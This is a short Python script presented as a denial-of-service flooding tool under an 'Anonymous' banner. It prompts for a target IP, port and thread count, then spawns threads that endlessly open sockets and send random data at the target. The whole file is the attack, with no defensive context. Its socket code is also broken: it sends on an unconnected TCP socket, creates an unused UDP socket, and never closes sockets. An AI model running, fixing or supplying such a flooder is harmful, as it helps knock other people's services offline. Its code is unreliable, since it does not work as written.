#!/usr/bin/env python3

import random
import socket
import threading

print("|----DDOS-PING----|")
print("|----Anonymous----|")
ip = str(input(" IP:"))
port = int(input(" PORT:"))      # The port used by the server
threads = int(input("PING:"))


def run():
	data = random._urandom(1204)
	data2 = random._urandom(16)
	while True:
			n = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			s.send(data2)
			s.connect((ip,port))
			for x in range(1):
				s.sendto(data,addr)
                
			print("[+] CONNECT TO", ip, port, "PING EXPORT =", threads)
			
for Y in range(threads):
		th = threading.Thread(target = run)
		th.start()
